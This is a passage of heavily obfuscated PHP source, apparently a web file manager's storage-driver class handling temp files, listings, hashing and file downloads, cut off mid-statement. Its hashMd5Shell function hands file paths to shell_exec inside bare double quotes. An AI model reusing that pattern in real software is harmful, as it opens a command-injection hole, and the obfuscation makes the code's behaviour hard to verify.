$òí’¾îœ = TEMP_FILES . rand_string(15) . $_SERVER[åÄ¼Ùßš][8]; @mkdir($òí’¾îœ, DEFAULT_PERRMISSIONS, !0); $Á¿¹—Ö¬ = $òí’¾îœ . $¸îÆ÷´; @touch($Á¿¹—Ö¬); if ($Ğùñ¬éÏ) { file_put_contents($Á¿¹—Ö¬, $Ğùñ¬éÏ); } return $Á¿¹—Ö¬; } public function tempFileRemve($·Á¶“•È) { @unlink($·Á¶“•È); @rmdir($this->pathFather($·Á¶“•È)); } public function mkfile($Õ’Û†ÆÛ, $û†â˜ù½ = '', $ºÔ’èöÀ = REPEAT_RENAME) { } public function mkdir($£ÚÓŞÑÏ, $¸ø˜£ƒá = REPEAT_SKIP) { } public function delFile($ú†’ãù¨) { } public function delFolder($ŸÖ­¦ê) { } public function copyFile($¸©Å¨Ï, $Ü¤ÑÚ•) { } public function moveFile($è°ğœÎ…, $ææ³Ø‘Ó) { } public function remove($·ßÁ±ï¹) { if ($this->isFile($·ßÁ±ï¹)) { return $this->delFile($·ßÁ±ï¹); } return $this->delFolder($·ßÁ±ï¹); } public function rename($ß ¸ÛÊè, $†ëş•Ô•) { } public function exist($èœšµŞÄ) { } public function findByHash($§åÜí = '', $“çÄÃÒš = '') { return !1; } public function isFile($ş¶³ğÃ) { } public function isFolder($á¸ÉÙ§) { } public function size($…‚ä–ö‚) { } public function info($—ƒÂ¯†¿) { } public function infoSimple($ê¡ğÆ·á) { return $this->info($ê¡ğÆ·á); } public function infoAuth($êê×Íéã) { return $this->info($êê×Íéã); } public function infoFull($úÆÅà) { return $this->info($úÆÅà); } public function infoFullSimple($ïİÉÓ™Ö) { return $this->info($ïİÉÓ™Ö); } public function infoWithChildren($²ââËë ) { $šØˆŠ« =& $_SERVER[åÄ¼Ùßš]; static $şºüÒ‚µ = array(); if (isset($şºüÒ‚µ[$²ââËë ])) { return $şºüÒ‚µ[$²ââËë ]; } $û«ùâß¼ = $this->info($²ââËë ); if ($û«ùâß¼ && $û«ùâß¼[$šØˆŠ«[33]] == $šØˆŠ«[78]) { $ÕÈöÖ·ì = array($šØˆŠ«[79] => 0, $šØˆŠ«[80] => 0, $šØˆŠ«[81] => 0); $this->infoChildren($²ââËë , $ÕÈöÖ·ì); $û«ùâß¼[$šØˆŠ«[79]] = $ÕÈöÖ·ì[$šØˆŠ«[79]]; $û«ùâß¼[$šØˆŠ«[82]] = array($šØˆŠ«[83] => $ÕÈöÖ·ì[$šØˆŠ«[80]], $šØˆŠ«[84] => $ÕÈöÖ·ì[$šØˆŠ«[81]]); $şºüÒ‚µ[$²ââËë ] = $û«ùâß¼; } return $û«ùâß¼; } public function listPath($Ø‡ê‚Ï, $Òº¢ï = false) { } public function has($ÎáŠ²ğ£, $¨”ü¥Ó” = false, $¾¶ã—æ£ = false) { } public function canRead($Âœ‹Œ†í) { } public function canWrite($“ı£‹úº) { } public function getContent($ı¨æ¡”) { } public function setContent($ÛŒ°‚¦“, $ìÅ®áéÆ = '') { } protected function infoChildren($òô±¨Û, &$¥ïÀ‹‹) { $Öş³Å˜Ä =& $_SERVER[åÄ¼Ùßš]; check_abort_echo(); $ÀıÁ¶® = $this->listPath($òô±¨Û, !0); $ÀıÁ¶® = array_merge($ÀıÁ¶®[$Öş³Å˜Ä[85]], $ÀıÁ¶®[$Öş³Å˜Ä[86]]); foreach ($ÀıÁ¶® as $ÎıŒºÎ©) { if ($ÎıŒºÎ©[$Öş³Å˜Ä[33]] == $Öş³Å˜Ä[78]) { $¥ïÀ‹‹[$Öş³Å˜Ä[81]]++; $ä¯öŠÌ = $this->getPathInner($ÎıŒºÎ©[$Öş³Å˜Ä[87]]); $this->infoChildren($ä¯öŠÌ, $¥ïÀ‹‹); } else { $¥ïÀ‹‹[$Öş³Å˜Ä[80]]++; $¥ïÀ‹‹[$Öş³Å˜Ä[79]] += $ÎıŒºÎ©[$Öş³Å˜Ä[79]]; } } } public function fileSubstr($¿šêæ´×, $ú°ÛÁ°—, $ğ‚ˆûä¡) { } public function listAll($È²À‘ãĞ) { } public function listAllMake($®÷ÔÉÕá, &$ãåŒ¡‡Ù) { $—ªûñÀó =& $_SERVER[åÄ¼Ùßš]; check_abort_echo(); $Ì¥„ñÓÉ = $this->listPath($®÷ÔÉÕá, !0); if (!$Ì¥„ñÓÉ) { return; } $›úòàõ‡ = array_merge($Ì¥„ñÓÉ[$—ªûñÀó[85]], $Ì¥„ñÓÉ[$—ªûñÀó[86]]); foreach ($›úòàõ‡ as $ÙÑâö°Œ) { $³šóÈ¤× = $ÙÑâö°Œ[$—ªûñÀó[33]] == $—ªûñÀó[78]; $Ôãíî© = array($—ªûñÀó[87] => $ÙÑâö°Œ[$—ªûñÀó[87]], $—ªûñÀó[78] => $³šóÈ¤×); if (isset($ÙÑâö°Œ[$—ªûñÀó[79]])) { $Ôãíî©[$—ªûñÀó[79]] = $ÙÑâö°Œ[$—ªûñÀó[79]]; } if (isset($ÙÑâö°Œ[$—ªûñÀó[88]])) { $Ôãíî©[$—ªûñÀó[88]] = $ÙÑâö°Œ[$—ªûñÀó[88]]; } if (!$³šóÈ¤×) { $ãåŒ¡‡Ù[] = $Ôãíî©; continue; } $ãåŒ¡‡Ù[] = $Ôãíî©; $¤¯‡ºÊ = $ÙÑâö°Œ[$—ªûñÀó[87]]; $£š€ş = $this->pathDriver; if (substr($ÙÑâö°Œ[$—ªûñÀó[87]], 0, strlen($£š€ş)) == $£š€ş) { $¤¯‡ºÊ = substr($¤¯‡ºÊ, strlen($£š€ş)); } $this->listAllMake($¤¯‡ºÊ, $ãåŒ¡‡Ù); } } public function listAllSimple($¿’¯ĞÈÂ, $ÍÅÒÏ—’ = false) { $–÷¡‚ÁÍ = $this->listAll($¿’¯ĞÈÂ); return $this->listAllSimpleMake($–÷¡‚ÁÍ, $this->getPathOuter($¿’¯ĞÈÂ), $ÍÅÒÏ—’); } public function listAllSimpleMake($¥ğŒÔû¶, $ü´Ğ›ÙÕ, $´ÕŸïë§) { $ÓŸÑµçµ =& $_SERVER[åÄ¼Ùßš]; $éóĞ †¥ = array(); $ü´Ğ›ÙÕ = rtrim(get_path_father($ü´Ğ›ÙÕ), $ÓŸÑµçµ[8]) . $ÓŸÑµçµ[8]; foreach ($¥ğŒÔû¶ as $„†ñæÑ©) { $ì…Ï¾ªÃ = array($ÓŸÑµçµ[87] => $„†ñæÑ©[$ÓŸÑµçµ[87]], $ÓŸÑµçµ[89] => $„†ñæÑ©[$ÓŸÑµçµ[87]], $ÓŸÑµçµ[78] => $„†ñæÑ©[$ÓŸÑµçµ[78]]); if (isset($„†ñæÑ©[$ÓŸÑµçµ[79]]) && !$„†ñæÑ©[$ÓŸÑµçµ[78]]) { $ì…Ï¾ªÃ[$ÓŸÑµçµ[79]] = $„†ñæÑ©[$ÓŸÑµçµ[79]]; } if (isset($„†ñæÑ©[$ÓŸÑµçµ[88]])) { $ì…Ï¾ªÃ[$ÓŸÑµçµ[88]] = $„†ñæÑ©[$ÓŸÑµçµ[88]]; } if (is_array($„†ñæÑ©[$ÓŸÑµçµ[90]])) { $ì…Ï¾ªÃ[$ÓŸÑµçµ[89]] = $„†ñæÑ©[$ÓŸÑµçµ[90]][$ÓŸÑµçµ[87]]; $ì…Ï¾ªÃ[$ÓŸÑµçµ[79]] = $„†ñæÑ©[$ÓŸÑµçµ[90]][$ÓŸÑµçµ[79]]; $ì…Ï¾ªÃ[$ÓŸÑµçµ[88]] = $„†ñæÑ©[$ÓŸÑµçµ[90]][$ÓŸÑµçµ[88]]; } else { if (substr($„†ñæÑ©[$ÓŸÑµçµ[87]], 0, strlen($ü´Ğ›ÙÕ)) == $ü´Ğ›ÙÕ) { $ì…Ï¾ªÃ[$ÓŸÑµçµ[87]] = substr($„†ñæÑ©[$ÓŸÑµçµ[87]], strlen($ü´Ğ›ÙÕ)); } } $ÂêĞÇ¨ı = $„†ñæÑ©[$ÓŸÑµçµ[78]] ? $ÓŸÑµçµ[8] : $ÓŸÑµçµ[12]; $ì…Ï¾ªÃ[$ÓŸÑµçµ[89]] = rtrim($ì…Ï¾ªÃ[$ÓŸÑµçµ[89]], $ÓŸÑµçµ[8]) . $ÂêĞÇ¨ı; $ì…Ï¾ªÃ[$ÓŸÑµçµ[87]] = $ÓŸÑµçµ[8] . trim($ì…Ï¾ªÃ[$ÓŸÑµçµ[87]], $ÓŸÑµçµ[8]) . $ÂêĞÇ¨ı; if (!$´ÕŸïë§) { $¨·ŸÈñÒ = explode($ÓŸÑµçµ[8], trim($ì…Ï¾ªÃ[$ÓŸÑµçµ[87]], $ÓŸÑµçµ[8])); $ì…Ï¾ªÃ[$ÓŸÑµçµ[87]] = $ÓŸÑµçµ[8] . implode($ÓŸÑµçµ[8], array_slice($¨·ŸÈñÒ, 1)) . $ÂêĞÇ¨ı; } $éóĞ †¥[] = $ì…Ï¾ªÃ; } return array_sort_by($éóĞ †¥, $ÓŸÑµçµ[87]); } public function upload($°¨ü¶ğõ, $âÇÑË¥ , $ç¶Ú±ÀÁ = false, $§şåºò = REPEAT_REPLACE) { } public function uploadFileByID($œÜİ¹œš, $ôÑÕæù, $•™¥È) { } public function uploadFileByPath($óÄæÂ¢¥, $Ø¯ß¡Òó, $š Ôšñ‡ = array()) { } public function isUploadServer() { $úôÄï°³ =& $_SERVER[åÄ¼Ùßš]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $úôÄï°³[91]) { return !0; } return $GLOBALS[$úôÄï°³[6]][$úôÄï°³[92]][$úôÄï°³[93]]; } public function isFileOutServer() { $ÁŒÏ›¯Ë =& $_SERVER[åÄ¼Ùßš]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $ÁŒÏ›¯Ë[91]) { return !0; } return $GLOBALS[$ÁŒÏ›¯Ë[6]][$ÁŒÏ›¯Ë[92]][$ÁŒÏ›¯Ë[94]]; } public function isCdnHost() { if ($this->isFileOutServer() || empty($this->cdnHost)) { return !1; } return request_url_safe($this->cdnHost) ? !0 : !1; } public function getCdnLink($€ò›Ñó…) { $˜öâÓ±« =& $_SERVER[åÄ¼Ùßš]; if (!$this->isCdnHost()) { return $€ò›Ñó…; } return str_replace(trim(get_url_root($€ò›Ñó…), $˜öâÓ±«[8]), trim($this->cdnHost, $˜öâÓ±«[8]), $€ò›Ñó…); } public function uploadLink($øœÊÂÆ, $Ğ›Ñ¿ ¢ = 0) { $»Ë„£’ =& $_SERVER[åÄ¼Ùßš]; if ($this->isUploadServer()) { return; } $‡¥²Îöß = $this->getType(); if (!in_array($‡¥²Îöß, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $ë¿¤à½­ = 1024 * 1024 * 10; $–¼“ïèù = $Ğ›Ñ¿ ¢ <= $ë¿¤à½­ ? $»Ë„£’[95] : $»Ë„£’[96]; $æç²·ù = (!$Ğ›Ñ¿ ¢ ? 1 : ceil($Ğ›Ñ¿ ¢ / pow(1024, 3))) * 3600 * 4; $™ÑŞÌ× = $this->{$–¼“ïèù}($øœÊÂÆ, $æç²·ù); if ($™ÑŞÌ×) { $™ÑŞÌ×[$»Ë„£’[97]] = $øœÊÂÆ; $™ÑŞÌ×[$»Ë„£’[98]] = $‡¥²Îöß; } return $™ÑŞÌ×; } public function uploadFormData($¨Ÿ¦õÆ¼, $ƒŸè•™± = 3600) { } public function uploadMultiData($Øï»Æ•Ø, $°ÚœÏË = 3600) { } public function multiUploadFormData($á·ëªç, $²ïºœ£ = 3600) { return $this->uploadMultiData($á·ëªç, $²ïºœ£); } public function download($ÊÄÉ¥Ö¨, $ƒĞ›œÆº) { } public function ext($ËæÜƒ¬ä) { $ÁÍò¾¤— =& $_SERVER[åÄ¼Ùßš]; if (strpos($ËæÜƒ¬ä, $ÁÍò¾¤—[8]) === -1) { $šßå¼”š = $ËæÜƒ¬ä; } else { $šßå¼”š = $this->pathThis($ËæÜƒ¬ä); } $ÚÅ„öÀ = $ÁÍò¾¤—[12]; if (strstr($šßå¼”š, $ÁÍò¾¤—[10])) { $ÚÅ„öÀ = substr($šßå¼”š, strrpos($šßå¼”š, $ÁÍò¾¤—[10]) + 1); $ÚÅ„öÀ = strtolower($ÚÅ„öÀ); } if (strlen($ÚÅ„öÀ) > 3 && preg_match($ÁÍò¾¤—[99], $ÚÅ„öÀ, $“Ó½ ğè)) { $ÚÅ„öÀ = $ÁÍò¾¤—[12]; } return $ÚÅ„öÀ; } public function pathThis($Éæµ½ÈÂ) { $€Ùäµ©› =& $_SERVER[åÄ¼Ùßš]; $Éæµ½ÈÂ = str_replace($€Ùäµ©›[100], $€Ùäµ©›[8], rtrim($Éæµ½ÈÂ, $€Ùäµ©›[8])); $û”ê¨›§ = strrpos($Éæµ½ÈÂ, $€Ùäµ©›[8]); if ($û”ê¨›§ === !1) { return $Éæµ½ÈÂ; } return substr($Éæµ½ÈÂ, $û”ê¨›§ + 1); } public function pathFather($çÈÔê¤­) { $Ò£¸à¹œ =& $_SERVER[åÄ¼Ùßš]; $çÈÔê¤­ = str_replace($Ò£¸à¹œ[100], $Ò£¸à¹œ[8], rtrim($çÈÔê¤­, $Ò£¸à¹œ[8])); $Ä´¸¬Õ = strrpos($çÈÔê¤­, $Ò£¸à¹œ[8]); if ($Ä´¸¬Õ === !1) { return $Ò£¸à¹œ[12]; } return substr($çÈÔê¤­, 0, $Ä´¸¬Õ + 1); } public function hashSimple($ƒù¾‘ÃÈ) { $êßÉ®ğ“ =& $_SERVER[åÄ¼Ùßš]; if (!$ƒù¾‘ÃÈ) { return md5($êßÉ®ğ“[12]); } $˜Æšşâ = $this->size($ƒù¾‘ÃÈ); $ÔÅµöé‹ = 200; $ƒÕ­½Ôî = 50; if ($˜Æšşâ <= $ÔÅµöé‹ * $ƒÕ­½Ôî) { return $this->hashMd5($ƒù¾‘ÃÈ) . $˜Æšşâ; } $«ü€ı• = intval($˜Æšşâ / $ƒÕ­½Ôî); $Ó¼şÔµÈ = $êßÉ®ğ“[12]; for ($Ìõ»—Å‹ = 0; $Ìõ»—Å‹ < $ƒÕ­½Ôî; $Ìõ»—Å‹++) { $Ó¼şÔµÈ .= $this->fileSubstr($ƒù¾‘ÃÈ, $«ü€ı• * $Ìõ»—Å‹, $ÔÅµöé‹); } $Ó¼şÔµÈ .= $this->fileSubstr($ƒù¾‘ÃÈ, $˜Æšşâ - $ÔÅµöé‹, $ÔÅµöé‹); return md5($Ó¼şÔµÈ) . $˜Æšşâ; } public static $md5Cache = array(); public function hashMd5($´ÀöñËó) { if (!$´ÀöñËó) { return md5($_SERVER[åÄ¼Ùßš][12]); } $´ÀöñËó = $this->iconvSystem($´ÀöñËó); if (isset(self::$md5Cache[$´ÀöñËó])) { return self::$md5Cache[$´ÀöñËó]; } self::$md5Cache[$´ÀöñËó] = $this->hashMd5Shell($´ÀöñËó); if (!self::$md5Cache[$´ÀöñËó]) { self::$md5Cache[$´ÀöñËó] = @md5_file($´ÀöñËó); } return self::$md5Cache[$´ÀöñËó]; } private function hashMd5Shell($—½¯”Ä) { $ ø€ğìµ =& $_SERVER[åÄ¼Ùßš]; if (!$—½¯”Ä) { return md5($ ø€ğìµ[12]); } if (!function_exists($ ø€ğìµ[101])) { return !1; } $Æğµ¨Èà = array($ ø€ğìµ[102], $ ø€ğìµ[103]); $ıÚàÜáŞ = Cache::get($ ø€ğìµ[104]); if (!$ıÚàÜáŞ) { $˜µ¯¡ƒö = BASIC_PATH . $ ø€ğìµ[105]; $ïĞ¹¢ß¶ = md5_file($˜µ¯¡ƒö); $ıÚàÜáŞ = $ ø€ğìµ[106]; foreach ($Æğµ¨Èà as $İ—ÓÍËÈ) { $€¡œúâ¡ = shell_exec($İ—ÓÍËÈ . "\40\x22{$˜µ¯¡ƒö}\42"); if ($€¡œúâ¡ && substr(trim($€¡œúâ¡), 0, 32) == $ïĞ¹¢ß¶) { $ıÚàÜáŞ = $İ—ÓÍËÈ; break; } } Cache::set($ ø€ğìµ[104], $ıÚàÜáŞ, 3600); } if ($ıÚàÜáŞ == $ ø€ğìµ[106]) { return !1; } $€¡œúâ¡ = shell_exec($ıÚàÜáŞ . "\x20\42{$—½¯”Ä}\x22"); $€¡œúâ¡ = str_replace($ ø€ğìµ[107], $ ø€ğìµ[12], $€¡œúâ¡); return substr($€¡œúâ¡, 0, 32); } public function link($¨Úì²÷€) { return $¨Úì²÷€; } public function fileOut($³€é¦¢¡, $¬Ãù¯¯ = false, $Èû‹ğ£Æ = false, $Ş°‹èİ“ = '') { $¢³•äÔ˜ =& $_SERVER[åÄ¼Ùßš]; $this->cacheMethod(null, null); if (!$³€é¦¢¡ || !$this->exist($³€é¦¢¡)) { show_json(LNG($¢³•äÔ˜[108]), !1, $Èû‹ğ£Æ); } $ıé©û™ = $this->getType() == $¢³•äÔ˜[109]; $ñÖÃó®© = $GLOBALS[$¢³•äÔ˜[6]][$¢³•äÔ˜[92]][$¢³•äÔ˜[110]][$¢³•äÔ˜[111]]; $Â÷Á‘ê‡ = (double) $GLOBALS[$¢³•äÔ˜[6]][$¢³•äÔ˜[92]][$¢³•äÔ˜[110]][$¢³•äÔ˜[112]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $ñÔ§Ç‹Ì = $this->infoFull($³€é¦¢¡); $òµ× ×— = $ñÔ§Ç‹Ì[$¢³•äÔ˜[79]]; $é¿œé¿ì = gmdate($¢³•äÔ˜[113], $ñÔ§Ç‹Ì[$¢³•äÔ˜[88]]); $à€€ÚÏ = $Èû‹ğ£Æ ? $Èû‹ğ£Æ : $this->iconvApp($ñÔ§Ç‹Ì[$¢³•äÔ˜[32]]); $îĞ»‰—Ó = 0; $Õ¾Ôëç• = $òµ× ×— - 1; $Î‹ÓÃ€Û = $this->ext($à€€ÚÏ); if (in_array($Î‹ÓÃ€Û, array($¢³•äÔ˜[114], $¢³•äÔ˜[115], $¢³•äÔ˜[116], $¢³•äÔ˜[117]))) { $Î‹ÓÃ€Û = $¢³•äÔ˜[118]; } if (in_array($Î‹ÓÃ€Û, array($¢³•äÔ˜[119]))) { $Î‹ÓÃ€Û = $¢³•äÔ˜[120]; } if (!$Ş°‹èİ“) { $Ş°‹èİ“ = md5($é¿œé¿ì . $òµ× ×—); } $Ş°‹èİ“ = $¢³•äÔ˜[121] . $Ş°‹èİ“ . $¢³•äÔ˜[121]; $­¤Æ…¢ = get_file_mime($Î‹ÓÃ€Û); $ïÒœš¶Ú = !0; $ïÒœš¶Ú = isset($_GET[$¢³•äÔ˜[122]]) ? !1 : !0; if ($¬Ãù¯¯ === !1 && !mime_support($­¤Æ…¢)) { $­¤Æ…¢ = $¢³•äÔ˜[123]; } header($¢³•äÔ˜[124]); header($¢³•äÔ˜[125] . $­¤Æ…¢); $ï«©ø¯ñ = rawurlencode($à€€ÚÏ); $ï«©ø¯ñ = $¢³•äÔ˜[121] . $ï«©ø¯ñ . $¢³•äÔ˜[126] . $ï«©ø¯ñ; if ($¬Ãù¯¯) { header($¢³•äÔ˜[127]); header($¢³•äÔ˜[128] . $ï«©ø¯ñ); } else { if ($ïÒœš¶Ú) { header($¢³•äÔ˜[129] . $ï«©ø¯ñ); } } $Ë»ó¿óË = 3600 * 24 * 30; header($¢³•äÔ˜[130]); header($¢³•äÔ˜[131]); header($¢³•äÔ˜[132] . $Ë»ó¿óË); header($¢³•äÔ˜[133] . gmdate($¢³•äÔ˜[113], time() + $Ë»ó¿óË) . $¢³•äÔ˜[134]); if (isset($_SERVER[$¢³•äÔ˜[135]]) && strtotime($_SERVER[$¢³•äÔ˜[135]]) == $ñÔ§Ç‹Ì[$¢³•äÔ˜[88]]) { header($¢³•äÔ˜[136], !0, 304); die; } if (isset($_SERVER[$¢³•äÔ˜[137]]) && $_SERVER[$¢³•äÔ˜[137]] == $Ş°‹èİ“) { header($¢³•äÔ˜[138] . $Ş°‹èİ“, !0, 304); die; } header($¢³•äÔ˜[138] . $Ş°‹èİ“); header($¢³•äÔ˜[139] . $é¿œé¿ì . $¢³•äÔ˜[134]); header($¢³•äÔ˜[140] . $à€€ÚÏ); header($¢³•äÔ˜[141]); header($¢³•äÔ˜[142] . $òµ× ×—); header($¢³•äÔ˜[143]); Hook::trigger($¢³•äÔ˜[144], $³€é¦¢¡, $òµ× ×—, $à€€ÚÏ, $Î‹ÓÃ€Û); if (!$¬Ãù¯¯ && $Î‹ÓÃ€Û == $¢³•äÔ˜[145]) { if ($òµ× ×— > 1024 * 1024 * 10) { die; } $¿ŠçïÌ» = $this->getContent($³€é¦¢¡); $¿ŠçïÌ» = Html::clearSVG($¿ŠçïÌ»); header($¢³•äÔ˜[146] . strlen($¿ŠçïÌ»)); echo $¿ŠçïÌ»; die; } $ÖôÓ”ÑŞ = strtolower($_SERVER[$¢³•äÔ˜[147]]); if ($ıé©û™ && $ÖôÓ”ÑŞ && $ñÖÃó®©) { if (strstr($ÖôÓ”ÑŞ, $¢³•äÔ˜[148])) { header($¢³•äÔ˜[149] . $³€é¦¢¡); } else { if (strstr($ÖôÓ”ÑŞ, $¢³•äÔ˜[150])) { header($¢³•äÔ˜[151] . $³€é¦¢¡); } else { if (strstr($ÖôÓ”ÑŞ, $¢³•äÔ˜[152])) { header($¢³•äÔ˜[153] . $³€é¦¢¡); } } } if ($Â÷Á‘ê‡) { header($¢³•äÔ˜[154] . $Â÷Á‘ê‡); } return; } if (isset($_SERVER[$¢³•äÔ˜[155]])) { if (preg_match($¢³•äÔ˜[156], $_SERVER[$¢³•äÔ˜[155]], $¤×€ï¥§)) { $îĞ»‰—Ó = intval($¤×€ï¥§[1]); $îĞ»‰—Ó = $îĞ»‰—Ó <= 0 ? 0 : ($îĞ»‰—Ó >= $Õ¾Ôëç• ? $Õ¾Ôëç• : $îĞ»‰—Ó); if (!empty($¤×€ï¥§[2])) { $û°‹ô†š = intval($¤×€ï¥§[2]); $Õ¾Ôëç• = $û°‹ô†š < $îĞ»‰—Ó ? $îĞ»‰—Ó : ($û°‹ô†š >= $Õ¾Ôëç• ? $Õ¾Ôëç• : $û°‹ô†š); } } header($¢³•äÔ˜[157]); header("\x43\x6f\156\x74\x65\x6e\164\55\122\x61\156\x67\x65\x3a\x20\142\171\164\x65\163\x20{$îĞ»‰—Ó}\55{$Õ¾Ôëç•}\x2f" . $òµ× ×—); } else { header($¢³•äÔ˜[158]); } header($¢³•äÔ˜[159]); header($¢³•äÔ˜[160]); $û …áŸú = !0; if ($_SERVER[$¢³•äÔ˜[161]] == $¢³•äÔ˜[162] && $òµ× ×— > 1204 * 1024 * 1024 * 2) { $û …áŸú = !1; } if ($û …áŸú) { header($¢³•äÔ˜[163] . ($Õ¾Ôëç• - $îĞ»‰—Ó + 1)); } if ($_SERVER[$¢³•äÔ˜[164]] == $¢³•äÔ˜[165]) { return; } $€ö–¾ğ” = array($¢³•äÔ˜[166] => !1, $¢³•äÔ˜[167] => $îĞ»‰—Ó, $¢³•äÔ˜[168] => $Õ¾Ôëç•, $¢³•äÔ˜[169] => $Î‹ÓÃ€Û, $¢³•äÔ˜[170] => $ñÔ§Ç‹Ì, $¢³•äÔ˜[171] => $¢³•äÔ˜[12], $¢³•äÔ˜[172] => 0); $€ö–¾ğ” = Hook::filter($¢³•äÔ˜[173], $€ö–¾ğ”); $ãÜ‡¾±º = 1024 * 300; $€¡€ŠŠ§ = 0; if ($Â÷Á‘ê‡) { $€¡€ŠŠ§ = intval(1000 * 1000 * ($ãÜ‡¾±º / $Â÷Á‘ê‡)); } while ($îĞ»‰—Ó <= $Õ¾Ôëç•) { $ê¾­¶ôÊ = timeFloat(); check_abort(); $ŸÜìÚâÓ = $Õ¾Ôëç• - $îĞ»‰—Ó + 1; if ($ŸÜìÚâÓ <= $ãÜ‡¾±º) { $ãÜ‡¾±º = $ŸÜìÚâÓ; } $¿ŠçïÌ» = $this->fileSubstr($³€é¦¢¡, $îĞ»‰—Ó, $ãÜ‡¾±º); if ($€ö–¾ğ”[$¢³•äÔ˜[166]]) { $€ö–¾ğ”[$¢³•äÔ˜[171]] = $¿ŠçïÌ»; $€ö–¾ğ”[$¢³•äÔ˜[172]] = $îĞ»‰—Ó; $€ö–¾ğ” = Hook::filter($¢³•äÔ˜[174], $€ö–¾ğ”); $¿ŠçïÌ» = $€ö–¾ğ”[$¢³•äÔ˜[171]]; } echo $¿ŠçïÌ»; $îĞ»‰—Ó += $ãÜ‡¾±º; if ($ãÜ‡¾±º == $ŸÜìÚâÓ) { $îĞ»‰—Ó = $Õ¾Ôëç• + 1; } if ($€¡€ŠŠ§) { $¿ñÀöƒ† = intval(1000 * 1000 * (timeFloat() - $ê¾­¶ôÊ)); $ŞØ• ÊÍ = $€¡€ŠŠ§ - $¿ñÀöƒ†; if ($ŞØ• ÊÍ > 5) { usleep($ŞØ• ÊÍ); } } } } public function fileOutServer($±’¤Éá‚, $‰ã‡Ü«Ú = false, $Ú×ô¶ªÌ = false, $Øáä¿…¢ = '') { $this->fileOut($±’¤Éá‚, $‰ã‡Ü«Ú, $Ú×ô¶ªÌ, $Øáä¿…¢); } public function fileOutLink($©Øı½…û) { header($_SERVER[åÄ¼Ùßš][175] . $©Øı½…û); die; } public function cacheMethod($¸ ö§üÁ, $—ºšªÀ, $ëº£¨¶× = null) { $±¹Îë…í =& $_SERVER[åÄ¼Ùßš]; static $å¬šÈ§ = array(); $ğ¡½›ª = $—ºšªÀ ? ltrim($this->getPathOuter($—ºšªÀ), $±¹Îë…í[8]) : $±¹Îë…í[12]; $¢æñ¸±» = $±¹Îë…í[176] . $¸ ö§üÁ . $±¹Îë…í[177] . rtrim($ğ¡½›ª, $±¹Îë…í[8]); if (is_null($¸ ö§üÁ)) { $å¬šÈ§ = array(); return; } if (is_null($—ºšªÀ)) { foreach ($å¬šÈ§ as $¢æñ¸±» => $ûæ°¹´í) { if (!strstr($¢æñ¸±», $±¹Îë…í[176] . $¸ ö§üÁ . $±¹Îë…í[178])) { continue; } unset($å¬šÈ§[$¢æñ¸±»]); } return; } if ($ëº£¨¶× === $±¹Îë…í[179]) { unset($å¬šÈ§[$¢æñ¸±»]); return; } if (!is_null($ëº£¨¶×)) { $å¬šÈ§[$¢æñ¸±»] = $ëº£¨¶×; return; } $Ÿ³›˜«á = isset($å¬šÈ§[$¢æñ¸±»]) ? $å¬šÈ§[$¢æñ¸±»] : null; if (!is_null($Ÿ³›˜«á)) { return $Ÿ³›˜«á; } $Ÿ³›˜«á = $this->{$¸ ö§üÁ}($—ºšªÀ); $å¬šÈ§[$¢æñ¸±»] = $Ÿ³›˜«á; return $Ÿ³›˜«á; } public function cacheMethodInfoSet($ÙÒ‡å, $Û¸¶…Õ¹, $áÌÑÒÖ§ = false) { $‹ã¡Ğë =& $_SERVER[åÄ¼Ùßš]; if ($this->listItemCache === !1) { return; } $this->cacheMethod($‹ã¡Ğë[180], $ÙÒ‡å, $Û¸¶…Õ¹); $this->cacheMethod($‹ã¡Ğë[181], $ÙÒ‡å, $Û¸¶…Õ¹ ? !1 : !0); if (is_array($áÌÑÒÖ§)) { $this->cacheMethod($‹ã¡Ğë[182], $ÙÒ‡å, $áÌÑÒÖ§); } } public function fileOutImage($‰ÛËÉÎÅ, $¦ÔÕÓ¼ä = 250) { $ø™“šä„ =& $_SERVER[åÄ¼Ùßš]; set_timeout(); if (substr($‰ÛËÉÎÅ, 0, 4) == $ø™“šä„[152]) { $this->fileOutLink($‰ÛËÉÎÅ); } $ƒ¢ª¥×† = $this->info($‰ÛËÉÎÅ); $¢ªÀÁî• = !1; $Î¤ã©ÉŞ = isset($GLOBALS[$ø™“šä„[183]]) ? $GLOBALS[$ø™“šä„[183]] : array(); if ($Î¤ã©ÉŞ && $Î¤ã©ÉŞ[$ø™“šä„[184]] == $ƒ¢ª¥×†[$ø™“šä„[87]]) { $ƒ¢ª¥×† = $Î¤ã©ÉŞ; $¦Ò€‰ = $ƒ¢ª¥×†[$ø™“šä„[185]]; if ($¦Ò€‰ && isset($¦Ò€‰[$ø™“šä„[186]])) { if ($¦Ò€‰[$ø™“šä„[186]] <= $¦ÔÕÓ¼ä && $¦Ò€‰[$ø™“šä„[187]] <= $¦ÔÕÓ¼ä) { $¢ªÀÁî• = !0; } } } if ($ƒ¢ª¥×†[$ø™“šä„[79]] <= 1024 * 50 || $¢ªÀÁî• || !function_exists($ø™“šä„[188]) || $ƒ¢ª¥×†[$ø™“šä„[169]] == $ø™“šä„[189]) { return $this->fileOut($‰ÛËÉÎÅ, !1, $ƒ¢ª¥×†[$ø™“šä„[32]]); } $Ø“îŞ£ = kodIO::hashPath($ƒ¢ª¥×†); $úë±ˆäí = "\143\x6f\x76\145\162\x5f{$Ø“îŞ£}\137{$¦ÔÕÓ¼ä}\x2e\x70\x6e\x67"; $ÏéÑÂ¹Ó = IO_PATH_SYSTEM_TEMP . $ø™“šä„[190]; $¯¾øùÈ = IO::infoFullSimple($ÏéÑÂ¹Ó); $äÕ¨Àı = $¯¾øùÈ && is_array($¯¾øùÈ) ? $¯¾øùÈ[$ø™“šä„[87]] : $ø™“šä„[12]; if (!$äÕ¨Àı) { $äÕ¨Àı = IO::mkdir($ÏéÑÂ¹Ó); } if ($ƒ¢ª¥×†[$ø™“šä„[191]] == $ø™“šä„[192] && isset($ƒ¢ª¥×†[$ø™“šä„[193]]) && $ƒ¢ª¥×†[$ø™“šä„[193]] == kodIO::sourceID($äÕ¨Àı)) { $–šù–«î = $ƒ¢ª¥×†[$ø™“šä„[194]]; if ($¦ÔÕÓ¼ä <= 500) { $„Ç şôö = preg_replace($ø™“šä„[195], $ø™“šä„[196], $ƒ¢ª¥×†[$ø™“šä„[32]]); $–šù–«î = IO::fileNameExist($äÕ¨Àı, $„Ç şôö); } return IO::fileOut(KodIO::make($–šù–«î), !1, 